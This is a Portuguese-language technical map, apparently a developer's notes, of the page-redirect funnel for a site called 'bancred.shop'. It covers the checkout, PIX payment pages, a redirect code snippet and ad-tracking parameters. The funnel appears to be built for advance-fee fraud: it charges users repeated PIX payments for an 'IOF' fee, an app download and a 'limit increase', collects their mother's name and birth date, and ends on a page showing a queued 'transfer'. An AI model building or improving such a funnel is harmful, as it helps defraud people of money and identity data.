# 🗺️ Mapeamento Completo de Redirecionamentos - Funil de Pagamentos

## 📋 Visão Geral do Funil

### **Fluxo Principal (Front-End)**
```
1. checkout.html → payment.html → [Após pagamento] → iof2.htm
```

### **Fluxo de Upsells (Back-End)**
```
1. Payment EMP → iof2.htm
2. Payment EMP UP1 → app-download.htm
3. Payment EMP UP2 → aumento-limite.htm
4. Payment EMP UP3 → assinatura.htm
5. Payment EMP UP4 → confirmacao-dados.htm
6. Payment EMP UP5 → iof.html (FINAL)
```

---

## 🔄 Redirecionamentos Detalhados

### **1. FLUXO PRINCIPAL (Front-End)**

#### **1.1. Checkout → Payment**
**Arquivo:** `conta/checkout.html`
- **Ação:** Usuário clica em "GERAR PIX"
- **Redireciona para:**
  - **Localhost:** `http://localhost/[pasta]/conta/checkout/pix/payment.html?id=[transactionId]`
  - **Produção:** `https://bancred.shop/conta/checkout/pix/payment.html?id=[transactionId]`
- **Extensão:** `.html`
- **Parâmetros:** `?id=[transactionId]` (sem tracking params na URL para não interferir na API)

#### **1.2. Payment → IOF2 (Primeiro Upsell)**
**Arquivo:** `conta/checkout/pix/payment.html`
- **Serviço:** `Payment EMP`
- **Ação:** Pagamento confirmado
- **Redireciona para:**
  - **Localhost:** `http://localhost/[pasta]/conta/saque/iof2.htm?[trackingParams]`
  - **Produção:** `https://bancred.shop/conta/saque/iof2.htm?[trackingParams]`
- **Extensão:** `.htm`
- **Parâmetros:** Tracking params restaurados do sessionStorage

---

### **2. FLUXO DE UPSELLS (Back-End)**

#### **2.1. IOF2 → App Download (UP1)**
**Arquivo:** `conta/saque/iof2.htm`
- **Serviço:** `Payment EMP UP1`
- **Ação:** Usuário clica em "Pagar agora"
- **Vai para:** `payment.html?id=[transactionId]`
- **Após pagamento confirmado:**
  - **Localhost:** `http://localhost/[pasta]/conta/app-download.htm?[trackingParams]`
  - **Produção:** `https://bancred.shop/conta/app-download.htm?[trackingParams]`
- **Extensão:** `.htm`

#### **2.2. App Download → Aumento Limite (UP2)**
**Arquivo:** `conta/app-download.htm`
- **Serviço:** `Payment EMP UP2`
- **Ação:** Usuário clica em "Baixar aplicativo"
- **Vai para:** `payment.html?id=[transactionId]`
- **Após pagamento confirmado:**
  - **Localhost:** `http://localhost/[pasta]/conta/aumento-limite.htm?[trackingParams]`
  - **Produção:** `https://bancred.shop/conta/aumento-limite.htm?[trackingParams]`
- **Extensão:** `.htm`

#### **2.3. Aumento Limite → Assinatura (UP3)**
**Arquivo:** `conta/aumento-limite.htm`
- **Serviço:** `Payment EMP UP3`
- **Ação:** Usuário clica em "Ativar novo limite"
- **Vai para:** `payment.html?id=[transactionId]`
- **Após pagamento confirmado:**
  - **Localhost:** `http://localhost/[pasta]/conta/assinatura.htm?[trackingParams]`
  - **Produção:** `https://bancred.shop/conta/assinatura.htm?[trackingParams]`
- **Extensão:** `.htm`

#### **2.4. Assinatura → Confirmação Dados (UP4)**
**Arquivo:** `conta/assinatura.htm`
- **Serviço:** `Payment EMP UP4` (não tem pagamento, apenas redireciona)
- **Ação:** Usuário faz assinatura e clica em "Continuar"
- **Redireciona para:**
  - **Localhost:** `http://localhost/[pasta]/conta/confirmacao-dados.htm?[trackingParams]`
  - **Produção:** `https://bancred.shop/conta/confirmacao-dados.htm?[trackingParams]`
- **Extensão:** `.htm`
- **Observação:** Esta página NÃO tem pagamento PIX, apenas validação de dados

#### **2.5. Confirmação Dados → IOF Final (UP5)**
**Arquivo:** `conta/confirmacao-dados.htm`
- **Serviço:** `Payment EMP UP5` (não tem pagamento, apenas redireciona)
- **Ação:** Usuário confirma dados e clica em "Continuar"
- **Redireciona para:**
  - **Localhost:** `http://localhost/[pasta]/conta/saque/iof.html?[trackingParams]`
  - **Produção:** `https://bancred.shop/conta/saque/iof.html?[trackingParams]`
- **Extensão:** `.html`
- **Observação:** Esta página NÃO tem pagamento PIX, apenas validação

#### **2.6. IOF Final (Página Final)**
**Arquivo:** `conta/saque/iof.html`
- **Serviço:** Nenhum (página final)
- **Ação:** Página de confirmação final - mostra status da transferência na fila
- **Redireciona para:** NENHUM (página final do funil)
- **Extensão:** `.html`
- **Observação:** 
  - Esta é a última página do funil, não há mais redirecionamentos automáticos
  - A página tem botões opcionais que redirecionam para:
    - `index.htm` (página inicial) - via função `goToHome()`
    - `conta.html` (página da conta) - via função `goToAccount()`
  - Mas esses são redirecionamentos manuais (usuário clica), não automáticos

---

## 📊 Resumo dos Redirecionamentos

### **Páginas com Pagamento PIX:**
1. ✅ `checkout.html` → `payment.html` → `iof2.htm`
2. ✅ `iof2.htm` → `payment.html` → `app-download.htm`
3. ✅ `app-download.htm` → `payment.html` → `aumento-limite.htm`
4. ✅ `aumento-limite.htm` → `payment.html` → `assinatura.htm`
5. ❌ `assinatura.htm` → `confirmacao-dados.htm` (SEM pagamento)
6. ❌ `confirmacao-dados.htm` → `iof.html` (SEM pagamento)
7. ✅ `iof.html` (PÁGINA FINAL - sem redirecionamento)

### **Extensões dos Arquivos:**
- **`.html`:** `checkout.html`, `payment.html`, `iof.html`
- **`.htm`:** `iof2.htm`, `app-download.htm`, `aumento-limite.htm`, `assinatura.htm`, `confirmacao-dados.htm`

---

## 🔗 URLs Completas (Produção)

### **Localhost:**
```
http://localhost/[pasta]/conta/checkout/pix/payment.html?id=[id]
http://localhost/[pasta]/conta/saque/iof2.htm?[params]
http://localhost/[pasta]/conta/app-download.htm?[params]
http://localhost/[pasta]/conta/aumento-limite.htm?[params]
http://localhost/[pasta]/conta/assinatura.htm?[params]
http://localhost/[pasta]/conta/confirmacao-dados.htm?[params]
http://localhost/[pasta]/conta/saque/iof.html?[params]
```

### **Produção:**
```
https://bancred.shop/conta/checkout/pix/payment.html?id=[id]
https://bancred.shop/conta/saque/iof2.htm?[params]
https://bancred.shop/conta/app-download.htm?[params]
https://bancred.shop/conta/aumento-limite.htm?[params]
https://bancred.shop/conta/assinatura.htm?[params]
https://bancred.shop/conta/confirmacao-dados.htm?[params]
https://bancred.shop/conta/saque/iof.html?[params]
```

---

## 📝 Observações Importantes

### **1. Tracking Parameters:**
- Todos os redirecionamentos preservam os parâmetros de tracking (UTM, gclid, fbclid, etc.)
- Os parâmetros são salvos no `sessionStorage` antes de entrar em `payment.html`
- Os parâmetros são restaurados após sair de `payment.html`

### **2. Payment.html:**
- **URL Limpa:** `payment.html?id=[transactionId]` (sem tracking params)
- **Motivo:** Evitar conflitos com a API PIX
- **Tracking:** Parâmetros são registrados temporariamente para scripts de tracking

### **3. Páginas Sem Pagamento:**
- `assinatura.htm` → Apenas validação de assinatura digital
- `confirmacao-dados.htm` → Apenas validação de dados (nome da mãe e data de nascimento)

### **4. Página Final:**
- `iof.html` → Última página do funil, não há mais redirecionamentos

---

## 🎯 Fluxo Completo Visual

```
┌─────────────────┐
│  checkout.html  │
└────────┬────────┘
         │ [GERAR PIX]
         ▼
┌─────────────────┐
│  payment.html   │ (Payment EMP)
└────────┬────────┘
         │ [Pagamento Confirmado]
         ▼
┌─────────────────┐
│   iof2.htm      │ (UP1)
└────────┬────────┘
         │ [Pagar agora]
         ▼
┌─────────────────┐
│  payment.html   │ (Payment EMP UP1)
└────────┬────────┘
         │ [Pagamento Confirmado]
         ▼
┌─────────────────┐
│ app-download.htm│ (UP2)
└────────┬────────┘
         │ [Baixar aplicativo]
         ▼
┌─────────────────┐
│  payment.html   │ (Payment EMP UP2)
└────────┬────────┘
         │ [Pagamento Confirmado]
         ▼
┌─────────────────┐
│aumento-limite.  │ (UP3)
│      htm        │
└────────┬────────┘
         │ [Ativar novo limite]
         ▼
┌─────────────────┐
│  payment.html   │ (Payment EMP UP3)
└────────┬────────┘
         │ [Pagamento Confirmado]
         ▼
┌─────────────────┐
│ assinatura.htm  │ (UP4)
└────────┬────────┘
         │ [Continuar] (SEM pagamento)
         ▼
┌─────────────────┐
│confirmacao-dados│ (UP5)
│      .htm       │
└────────┬────────┘
         │ [Continuar] (SEM pagamento)
         ▼
┌─────────────────┐
│   iof.html      │ (FINAL)
└─────────────────┘
```

---

## ✅ Checklist de Redirecionamentos

### **Redirecionamentos Automáticos (Após Pagamento):**
- [x] `checkout.html` → `payment.html` (com id)
- [x] `payment.html` (Payment EMP) → `iof2.htm` (com tracking)
- [x] `iof2.htm` → `payment.html` (com id)
- [x] `payment.html` (UP1) → `app-download.htm` (com tracking)
- [x] `app-download.htm` → `payment.html` (com id)
- [x] `payment.html` (UP2) → `aumento-limite.htm` (com tracking)
- [x] `aumento-limite.htm` → `payment.html` (com id)
- [x] `payment.html` (UP3) → `assinatura.htm` (com tracking)
- [x] `assinatura.htm` → `confirmacao-dados.htm` (com tracking, SEM pagamento)
- [x] `confirmacao-dados.htm` → `iof.html` (com tracking, SEM pagamento)
- [x] `iof.html` → NENHUM (página final - sem redirecionamento automático)

### **Redirecionamentos Manuais (Botões Opcionais):**
- [ ] `iof.html` → `index.htm` (botão "Voltar ao Início" - opcional)
- [ ] `iof.html` → `conta.html` (botão "Minha Conta" - opcional)

---

## 🔧 Código de Redirecionamento (payment.html)

```javascript
// Localhost
if(servico == 'Payment EMP'){
    redirectUrl = basePath + '/conta/saque/iof2.htm';
} else if(servico == 'Payment EMP UP1'){
    redirectUrl = basePath + '/conta/app-download.htm';
} else if(servico == 'Payment EMP UP2'){
    redirectUrl = basePath + '/conta/aumento-limite.htm';
} else if(servico == 'Payment EMP UP3'){
    redirectUrl = basePath + '/conta/assinatura.htm';
} else if(servico == 'Payment EMP UP4'){
    redirectUrl = basePath + '/conta/confirmacao-dados.htm';
} else if(servico == 'Payment EMP UP5'){
    redirectUrl = basePath + '/conta/saque/iof.html';
}

// Produção
if(servico == 'Payment EMP'){
    redirectUrl = "https://bancred.shop/conta/saque/iof2.htm" + trackingParams;
} else if(servico == 'Payment EMP UP1'){
    redirectUrl = "https://bancred.shop/conta/app-download.htm" + trackingParams;
} else if(servico == 'Payment EMP UP2'){
    redirectUrl = "https://bancred.shop/conta/aumento-limite.htm" + trackingParams;
} else if(servico == 'Payment EMP UP3'){
    redirectUrl = "https://bancred.shop/conta/assinatura.htm" + trackingParams;
} else if(servico == 'Payment EMP UP4'){
    redirectUrl = "https://bancred.shop/conta/confirmacao-dados.htm" + trackingParams;
} else if(servico == 'Payment EMP UP5'){
    redirectUrl = "https://bancred.shop/conta/saque/iof.html" + trackingParams;
}
```

